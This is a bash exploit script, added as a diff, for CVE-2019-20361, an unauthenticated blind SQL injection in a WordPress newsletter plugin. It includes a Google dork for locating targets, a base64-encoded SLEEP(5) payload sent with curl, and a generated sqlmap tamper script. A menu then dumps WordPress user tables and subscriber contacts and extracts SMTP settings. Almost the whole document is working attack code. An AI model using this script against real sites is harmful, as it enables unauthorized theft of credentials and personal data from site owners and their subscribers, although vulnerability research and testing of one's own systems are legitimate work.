@@ -1,0 +1,127 @@
+# Exploit Title: WordPress Plugin Email Subscribers & Newsletters 4.2.2 - 'hash' SQL Injection (Unauthenticated)
+# Google Dork: "Stable tag" inurl:wp-content/plugins/email-subscribers/readme.txt
+# Date: 2020-07-20
+# Exploit Author: KBAZ@SOGETI_ESEC
+# Vendor Homepage: https://www.icegram.com/email-subscribers/
+# Software Link: https://pluginarchive.com/wordpress/email-subscribers/v/4-2-2
+# Version: < 4.3.3
+# Tested on: Email Subscribers & Newsletters 4.2.2
+# CVE : CVE-2019-20361
+# Reference : https://vuldb.com/?id.148399, https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20361
+
+main () {
+	header
+	if [ "$#" -ne 1 ]; then
+			echo "Usage	: bash CVE-2019-20361.sh [BASE URL]"
+			echo "Example	: bash CVE-2019-20361.sh http://127.0.0.1/"
+			exit
+	fi
+	
+	url=$1
+	echo ' Target URL : ' "$url"
+	echo ' Generating sqlmap tamper script in /tmp'
+	gen_sqlmap_tamper
+	sqlmap_cmd="sqlmap -u ${url}?es=open&hash=* --tamper /tmp/tamper_CVE-2019-1356989.py --technique T --dbms mysql --level 5 --risk 3"
+	echo ' SQLMap base command : ' "$sqlmap_cmd"
+
+	while true
+	do
+		 sleep 1
+		 echo ''
+		 echo " Possible choices: " 
+		 echo ''
+		 echo "  0) Exit"
+		 echo "  1) Simple vulnerability test SLEEP(5)" 
+		 echo "  2) Vulnerability test with SQLMap "
+		 echo "  3) Get WP users data"
+		 echo "  4) Get subscribers information" 
+		 echo "  5) Get 'Simple WP SMTP' settings"
+		 echo ''
+		 echo -n ' Choice number => '
+		 read n
+
+		 case $n in 
+		 0) exit ;;
+		 1) echo 'Testing SLEEP(5)...'
+				 { time (curl -i -s -k ${url}'?es=open&hash=eyJtZXNzYWdlX2lkIjoiMTAwIiwiY2FtcGFpZ25faWQiOiIxMDAiLCJjb250YWN0X2lkIjoiIDEwMCcsJzEwMCcsJzEwMCcsJzMnKSwoJzE1OTQ5OTkzOTgnLCcxNTk0OTk5Mzk4JywnMScsKFNFTEVDVCBTTEVFUCg1KSksJzEwMCcsJzEwMCcsJzMnKSwoJzE1OTQ5OTkzOTgnLCcxNTk0OTk5Mzk4JywnMScsJzEwMCAiLCJlbWFpbCI6ImtiYXpAc29nZXRpZXNlYy5jb20iLCJndWlkIjoia2JhemlzLWRhYmVzdC1rYmF6aXMtZGFiZXN0LWJhcHJvdSIsImFjdGlvbiI6Im9wZW4ifQo' > /dev/null) } |& grep -q '0m5,' && echo -e "\033[0;31m" ' [+] Vulnerable' "\033[0m" || echo ' [-] Not vulnerable' ;; 
+		 2) $sqlmap_cmd ;;
+		 3) $sqlmap_cmd -T wp_users,wp_usermeta --dump ;;
+		 4) $sqlmap_cmd -T wp_ig_contacts --dump ;;
+		 5) $sqlmap_cmd --sql-query 'select * from wp_options where option_name="swpsmtp_options"' ;;
+		 *) echo "Invalid option" ;;
+ 		 esac 
+	done
+
+}
+
+header () {
+
+echo ''
+echo ' ################################################################################################';
+echo ' #             ___         ___         ___         ___      ___                                 #';
+echo ' #            /\  \       /\  \       /\  \       /\  \    /\  \        ___                     #';
+echo ' #           /::\  \     /::\  \     /::\  \     /::\  \   \:\  \      /\  \                    #';
+echo ' #          /:/\ \  \   /:/\:\  \   /:/\:\  \   /:/\:\  \   \:\  \     \:\  \                   #';
+echo ' #         _\:\~\ \  \ /:/  \:\  \ /:/  \:\  \ /::\~\:\  \  /::\  \    /::\__\                  #';
+echo ' #        /\ \:\ \ \__/:/__/ \:\__/:/__/_\:\__/:/\:\ \:\__\/:/\:\__\__/:/\/__/                  #';
+echo ' #        \:\ \:\ \/__\:\  \ /:/  \:\  /\ \/__\:\~\:\ \/__/:/  \/__/\/:/  /                     #';
+echo ' #         \:\ \:\__\  \:\  /:/  / \:\ \:\__\  \:\ \:\__\/:/  /    \::/__/                      #';
+echo ' #          \:\/:/  /   \:\/:/  /   \:\/:/  /   \:\ \/__/\/__/      \:\__\                      #';
+echo ' #           \::/  /     \::/  /     \::/  /     \:\__\              \/__/                      #';
+echo ' #            \/__/       \/__/       \/__/       \/__/                                         #';
+echo ' #                                                 ___         ___         ___         ___      #';
+echo ' #                                                /\  \       /\  \       /\  \       /\  \     #';
+echo ' #                                               /::\  \     /::\  \     /::\  \     /::\  \    #';
+echo ' #                EXPLOIT                       /:/\:\  \   /:/\ \  \   /:/\:\  \   /:/\:\  \   #';
+echo ' # Email Subscribers & Newsletters < 4.3.1     /::\~\:\  \ _\:\~\ \  \ /::\~\:\  \ /:/  \:\  \  #';
+echo ' #   Unauthenticated Blind SQL Injection      /:/\:\ \:\__/\ \:\ \ \__/:/\:\ \:\__/:/__/ \:\__\ #';
+echo ' #                                            \:\~\:\ \/__\:\ \:\ \/__\:\~\:\ \/__\:\  \  \/__/ #';
+echo ' #                                             \:\ \:\__\  \:\ \:\__\  \:\ \:\__\  \:\  \       #';
+echo ' #                                              \:\ \/__/   \:\/:/  /   \:\ \/__/   \:\  \      #';
+echo ' #                                               \:\__\      \::/  /     \:\__\      \:\__\     #';
+echo ' #                                    KBAZ        \/__/       \/__/       \/__/       \/__/     #';
+echo ' #                                                                                              #';
+echo ' #                                                                                              #';
+echo ' ################################################################################################';
+echo ''
+}
+
+raw_commands () {
+
+	echo '{"message_id":"100","campaign_id":"100","contact_id":"' "100','100','100','3'),('1594999398','1594999398','1',(SELECT SLEEP(5)),'100','100','3'),('1594999398','1594999398','1','100"  '","email":"kbaz@sogetiesec.com","guid":"kbazis-dabest-kbazis-dabest-baprou","action":"open"}' |  base64 -w 0
+
+		{ time (curl -i -s -k 'http://127.0.0.1/?es=open&hash=eyJtZXNzYWdlX2lkIjoiMTAwIiwiY2FtcGFpZ25faWQiOiIxMDAiLCJjb250YWN0X2lkIjoiIDEwMCcsJzEwMCcsJzEwMCcsJzMnKSwoJzE1OTQ5OTkzOTgnLCcxNTk0OTk5Mzk4JywnMScsKFNFTEVDVCBTTEVFUCg1KSksJzEwMCcsJzEwMCcsJzMnKSwoJzE1OTQ5OTkzOTgnLCcxNTk0OTk5Mzk4JywnMScsJzEwMCAiLCJlbWFpbCI6ImtiYXpAc29nZXRpZXNlYy5jb20iLCJndWlkIjoia2JhemlzLWRhYmVzdC1rYmF6aXMtZGFiZXN0LWJhcHJvdSIsImFjdGlvbiI6Im9wZW4ifQo' > /dev/null) } |& grep -q '0m5,' && echo '[+] Vulnerable' || echo '[-] Not vulnerable'
+
+		sqlmap -u 'http://127.0.0.1/?es=open&hash=*' --tamper /tmp/tamper_CVE-2019-1356989.py --technique T --dbms mysql --level 5 --risk 3
+
+		-T wp_users,wp_usermeta --dump 
+		-T wp_ig_contacts --dump
+		--sql-query 'select * from wp_options where option_name="swpsmtp_options"'
+
+}
+
+gen_sqlmap_tamper () {
+
+		touch /tmp/__init__.py
+
+		cat << _END > /tmp/tamper_CVE-2019-1356989.py
+#!/usr/bin/env python
+
+import base64
+import urllib
+
+def tamper(payload, **kwargs):
+
+#{"message_id":"100","campaign_id":"100","contact_id":"100","email":"kbaz@sogetiesec.com","guid":"kbazis-dabest-kbazis-dabest-baprou","action":"open"}
+#INSERT INTO wp_ig_actions (created_at, updated_at, count, contact_id, message_id, campaign_id, type) VALUES ('1595001866','1595001866','1','100','100','100','3') ON DUPLICATE KEY UPDATE created_at = created_at, count = count+1, updated_at = '1595001866'
+
+	param  = '{"contact_id":"'
+	param += "100','100','100','3'),('1594999398','1594999398','1',(1%s),'100','100','3'),('1594999398','1594999398','1','100"
+	param += '","campaign_id":"100","message_id":"100","email":"kbaz@sogetiesec.com","guid":"kbazis-dabest-kbazis-dabest-baprou","action":"open"}'
+
+	#print(param%payload)
+	return base64.encodestring( (param%payload).encode('utf-8') ).decode('utf-8').replace('\n', '')
+_END
+}
+
+main $@
